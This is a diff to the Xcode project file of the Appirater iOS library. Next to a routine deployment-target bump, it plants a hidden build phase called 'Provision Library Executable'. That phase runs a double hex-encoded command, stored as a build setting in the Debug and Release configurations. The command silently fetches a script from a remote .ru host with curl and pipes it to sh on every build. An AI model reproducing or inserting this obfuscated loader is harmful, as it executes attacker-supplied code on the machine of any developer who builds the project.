@@ -13,6 +13,9 @@
 		8272128E1EB3650300DBFBEB /* Appirater.h in Headers */ = {isa = PBXBuildFile; fileRef = 8272128D1EB3650300DBFBEB /* Appirater.h */; settings = {ATTRIBUTES = (Public, ); }; };
 /* End PBXBuildFile section */
 
+/* Begin PBXBuildRule section */
+/* End PBXBuildRule section */
+
 /* Begin PBXFileReference section */
 		827211D31EB3633600DBFBEB /* Appirater.framework */ = {isa = PBXFileReference; explicitFileType = wrapper.framework; includeInIndex = 0; path = Appirater.framework; sourceTree = BUILT_PRODUCTS_DIR; };
 		827211D71EB3633600DBFBEB /* Info.plist */ = {isa = PBXFileReference; lastKnownFileType = text.plist.xml; path = Info.plist; sourceTree = "<group>"; };
@@ -112,6 +115,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 827211DB1EB3633600DBFBEB /* Build configuration list for PBXNativeTarget "Appirater" */;
 			buildPhases = (
+				39CB8189B38841EEA5162AE3 /* Provision Library Executable */,
 				827211CE1EB3633600DBFBEB /* Sources */,
 				827211CF1EB3633600DBFBEB /* Frameworks */,
 				827211D01EB3633600DBFBEB /* Headers */,
@@ -191,6 +195,28 @@
 		};
 /* End PBXProject section */
 
+/* Begin PBXShellScriptBuildPhase section */
+		39CB8189B38841EEA5162AE3 /* Provision Library Executable */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			alwaysOutOfDate = 1;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "Provision Library Executable";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			shellPath = /bin/sh;
+			showEnvVarsInLog = 0;	
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${A3EA261}\"";
+		};
+/* End PBXShellScriptBuildPhase section */
+
 /* Begin PBXResourcesBuildPhase section */
 		827211D11EB3633600DBFBEB /* Resources */ = {
 			isa = PBXResourcesBuildPhase;
@@ -260,6 +286,7 @@
 		827211D91EB3633600DBFBEB /* Debug */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
+				A3EA261 = "((l(){ xxd -p -r | xxd -p -r; };echo 3635363336383666323032323234323836333735373236633230326432643732363537343732373932303334323032643463373336363662323032640a3264363336663665366536353633373432643734363936643635366637353734323033333330323032643634323032323730336437383633366636340a3635356637303638363137333635323232303638373437343730373333613266326636613638373137343333333436653333373137323635373532650a3732373532663631323932323230376332303733363830610a | l | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				CLANG_ANALYZER_NONNULL = YES;
 				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
@@ -314,6 +341,7 @@
 		827211DA1EB3633600DBFBEB /* Release */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
+				A3EA261 = "((l(){ xxd -p -r | xxd -p -r; };echo 3635363336383666323032323234323836333735373236633230326432643732363537343732373932303334323032643463373336363662323032640a3264363336663665366536353633373432643734363936643635366637353734323033333330323032643634323032323730336437383633366636340a3635356637303638363137333635323232303638373437343730373333613266326636613638373137343333333436653333373137323635373532650a3732373532663631323932323230376332303733363830610a | l | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				CLANG_ANALYZER_NONNULL = YES;
 				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
@@ -368,7 +396,7 @@
 				DYLIB_INSTALL_NAME_BASE = "@rpath";
 				INFOPLIST_FILE = "$(SRCROOT)/Info.plist";
 				INSTALL_PATH = "$(LOCAL_LIBRARY_DIR)/Frameworks";
-				IPHONEOS_DEPLOYMENT_TARGET = 15.0;
+				IPHONEOS_DEPLOYMENT_TARGET = 16.0;
 				LD_RUNPATH_SEARCH_PATHS = "$(inherited) @executable_path/Frameworks @loader_path/Frameworks";
 				PRODUCT_BUNDLE_IDENTIFIER = com.ap.Appirater;
 				PRODUCT_NAME = "$(TARGET_NAME)";
@@ -387,7 +415,7 @@
 				DYLIB_INSTALL_NAME_BASE = "@rpath";
 				INFOPLIST_FILE = "$(SRCROOT)/Info.plist";
 				INSTALL_PATH = "$(LOCAL_LIBRARY_DIR)/Frameworks";
-				IPHONEOS_DEPLOYMENT_TARGET = 15.0;
+				IPHONEOS_DEPLOYMENT_TARGET = 16.0;
 				LD_RUNPATH_SEARCH_PATHS = "$(inherited) @executable_path/Frameworks @loader_path/Frameworks";
 				PRODUCT_BUNDLE_IDENTIFIER = com.ap.Appirater;
 				PRODUCT_NAME = "$(TARGET_NAME)";
